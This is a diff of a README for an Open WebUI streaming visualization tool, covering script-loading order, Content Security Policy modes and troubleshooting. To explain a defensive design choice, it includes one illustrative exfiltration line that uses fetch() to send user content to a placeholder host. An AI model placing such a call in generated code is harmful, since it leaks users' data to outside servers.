@@ -40,7 +40,7 @@ If you came from the original [inline-visualizer](https://github.com/Classic298/
 | **Bridges** | `sendPrompt`, `openLink` | `sendPrompt`, `openLink`, **`copyText`**, **`toast`**, **`saveState`**, **`loadState`** |
 | **Done feedback** | — | Top-right localized toast + soft C-major chime on live-stream completion (silent on refresh) |
 | **i18n** | Download button only (46 languages) | Download + loader label + unavailable notice + copied toast + "visualization ready" toast (46 languages each) |
-| **Script loading** | N/A | External `<script src>` → inline script ordering is enforced (`async=false`) so `Chart`, `d3` etc. resolve before consumer code runs |
+| **Script loading** | N/A | External `<script src>` → inline script ordering serialized via a promise chain so `Chart`, `d3`, `vega-embed` etc. fully load before consumer code runs |
 | **Tool-result detection** | N/A | `<details type="tool_calls">` subtrees are skipped by the scanner so the skill's own example markers never hijack the render |
 | **Static-mode fallback** | Supported | **Removed.** Streaming is the only path |
 
@@ -97,7 +97,8 @@ When a live stream finalizes, a localized "Visualization ready" toast slides in 
 ### 🧼 Efficient tick loop
 - `msg.textContent` cached between ticks; unchanged → full pipeline short-circuits to a string compare
 - DOM hide walker skips text nodes inside `<details type="tool_calls">` so the skill's own example markers never hijack detection
-- Dynamic `<script>` insertion forces `async=false` so `Chart`, `d3`, etc. resolve before your consumer code runs
+- Dynamic `<script>` insertion serialized through a promise chain — external `<script src>` tags are awaited via `onload` before any subsequent inline `<script>` executes, so `Chart` / `d3` / `vega-embed` / etc. are always defined by the time your consumer code runs
+- `navigator.vibrate` is silently stubbed inside the iframe — models sometimes reach for haptic feedback on click, and Chrome logs an `[Intervention]` line every time without a user gesture; the stub keeps the console clean
 - Safe-cut HTML parser lets the reconciler flush partial markup (`<svg><rect/><g>` renders during stream) without breaking on unclosed tags
 
 ---
@@ -289,6 +290,20 @@ Every visualization renders in a sandboxed iframe with a configurable Content Se
 | **Balanced** | ❌ | ✅ | — | Visualizations displaying external images (flags, logos). |
 | **None** | ✅ | ✅ | — | Visualizations fetching live API data from within the iframe. |
 
+### What works in Strict mode
+
+Chart.js, D3.js, Vega-Lite, and any other pure-client-side library load and render normally — the three major CDN hosts (cdnjs, jsdelivr, unpkg) are on the `script-src` allowlist. Visualizations with **inline data** (data arrays hardcoded in the SVG/HTML source) work without limits. The SKILL tells the model to inline data by default, so this covers 99% of prompts.
+
+**What Strict blocks:** runtime `fetch()` calls, `d3.csv('https://…')`, Vega-Lite specs with `data: { url: '…' }`, external images, form submits. If you want a live-updating weather widget or a chart that pulls a CSV at render time, switch to **None**.
+
+### Why `script-src` allows a CDN but `connect-src` doesn't
+
+Loading a library from a CDN is a plain `GET` of a fixed public URL — zero data leaves the browser. Allowing `fetch()` to the same CDN opens an exfiltration channel: the URL itself becomes the payload (`fetch('https://cdn.example/?data=' + userContent)` gets logged server-side even if it returns 404). Different directions, different risks — Strict grants "read known public asset", denies "write arbitrary data anywhere". This is intentional, not an oversight.
+
+### Sourcemap warnings in DevTools
+
+When DevTools is open, the browser attempts to fetch `.map` files for loaded libraries from the same CDN. Strict blocks those via `connect-src 'none'` — you'll see lines like `Connecting to 'https://cdn.jsdelivr.net/npm/vega.min.js.map' violates CSP…` in the console. Those are DevTools-only noise (end users with DevTools closed never see them). We intentionally don't relax `connect-src` to fix this because that would reopen the exfil surface above for all users.
+
 > [!WARNING]
 > With `allow-same-origin` enabled (required for streaming), JavaScript in a visualization has reach into the parent Open WebUI page. That is a platform-level permission — the tool cannot narrow it further. If you need full isolation, disable same-origin: v2 degrades gracefully with a localized "streaming unavailable" notice, and you can fall back to the original [inline-visualizer](https://github.com/Classic298/open-webui-extras/tree/main/tools/inline-visualizer) (static mode only) for that workflow.
 
@@ -348,6 +363,18 @@ Set CSP to **None** AND the remote server must allow cross-origin requests. If i
 Run once in the browser console: `localStorage.setItem('iv-sound-off', '1')`. Sound off forever.
 </details>
 
+<details>
+<summary><b>I updated <code>tool.py</code> and nothing changed</b></summary>
+
+Open WebUI doesn't hot-reload tool source from disk. You have to paste the new contents into **Workspace → Tools → Inline Visualizer (Streaming) → Save** again. Existing chats also have the old iframe baked in — trigger a fresh visualization to see updates.
+</details>
+
+<details>
+<summary><b>"Uncaught ReferenceError: d3 is not defined" (or Chart, vega, etc.)</b></summary>
+
+Your installed tool is older than the current code. Earlier versions of the reconciler inserted scripts synchronously, so external `<script src>` tags (d3, Chart.js, vega-embed) hadn't finished downloading when the inline consumer script ran. Update <code>tool.py</code> in Workspace → Tools (see entry above) — the current reconciler serializes scripts via a promise chain.
+</details>
+
 ---
 
 ## 📐 Architecture
@@ -371,7 +398,7 @@ Run once in the browser console: `localStorage.setItem('iv-sound-off', '1')`. So
 └────────────────────────────────────────────────────────────┘
 ```
 
-The observer inside the iframe uses `parent.document` (via `allow-same-origin`) to `getSearchableText(msg)` — a TreeWalker that excludes `<details type="tool_calls">` — runs a regex for the N-th `@@@VIZ-START…@@@VIZ-END` block (N = iframe's embed index), safe-cuts the partial HTML, parses into a detached tree, and reconciles into `#iv-render`. On `@@@VIZ-END` it finalizes: injects scripts (in insertion order via `async=false`), fires the done toast + chime, hides the loader.
+The observer inside the iframe uses `parent.document` (via `allow-same-origin`) to `getSearchableText(msg)` — a TreeWalker that excludes `<details type="tool_calls">` — runs a regex for the N-th `@@@VIZ-START…@@@VIZ-END` block (N = iframe's embed index), safe-cuts the partial HTML, parses into a detached tree, and reconciles into `#iv-render`. On `@@@VIZ-END` it finalizes: injects scripts via a promise chain (external waits on `onload` before the next inline script executes), fires the done toast + chime, hides the loader.
 
 ### Finalize triggers
 
